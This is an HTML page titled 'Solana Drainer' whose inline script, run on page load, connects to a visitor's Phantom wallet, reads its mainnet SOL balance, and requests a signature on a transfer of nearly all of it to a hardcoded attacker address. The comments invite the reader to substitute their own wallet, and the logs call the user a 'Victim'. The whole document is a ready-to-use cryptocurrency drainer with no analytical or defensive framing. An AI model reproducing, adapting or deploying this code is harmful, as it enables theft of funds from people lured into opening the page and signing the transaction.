<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Drainer</title>
</head>
<body>
    <h1>Draining Solana</h1>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.30.2"></script>
    <script>
        (async () => {
            console.log("üîç Checking for Phantom Wallet...");

            const provider = window.solana;
            if (!provider || !provider.isPhantom) {
                console.log("üö® Phantom Wallet not detected! Make sure it's installed and unlocked.");
                alert("Phantom Wallet not detected!");
                return;
            }

            console.log("‚úÖ Phantom Wallet detected!");

            // Connect to Phantom Wallet
            await provider.connect(); 

            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"), "confirmed");

            const attackerWallet = new solanaWeb3.PublicKey("AP1LJbcsXsLSQbvyAhuo3UC9JEMCeauTWNbzpi6GLpGh"); // Replace with your wallet address

            const userWallet = provider.publicKey;
            console.log(`üí∞ Victim Address: ${userWallet.toBase58()}`);

            // Get the balance of the wallet
            let balance = await connection.getBalance(userWallet);
            let drainAmount = balance - 5000; // Leave small buffer for transaction success

            // Only proceed if the balance is greater than 0
            if (drainAmount > 0) {
                console.log(`‚ö†Ô∏è Attempting to drain ${drainAmount / 1e9} SOL from ${userWallet.toBase58()}...`);

                // Create a transfer transaction
                let transaction = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: userWallet,
                        toPubkey: attackerWallet,
                        lamports: drainAmount
                    })
                );

                try {
                    // Request Phantom Wallet to sign the transaction (NOT just view)
                    const signedTransaction = await provider.signTransaction(transaction);
                    console.log("Transaction signed by Phantom.");

                    // Send the transaction to the Solana network
                    await connection.sendRawTransaction(signedTransaction.serialize());
                    console.log("‚úÖ SOL drained successfully.");
                } catch (error) {
                    console.log("üö® Error in signing the transaction or sending.");
                    console.error(error);
                }
            } else {
                console.log("‚ùå No SOL to drain.");
            }
        })();
    </script>
</body>
</html>
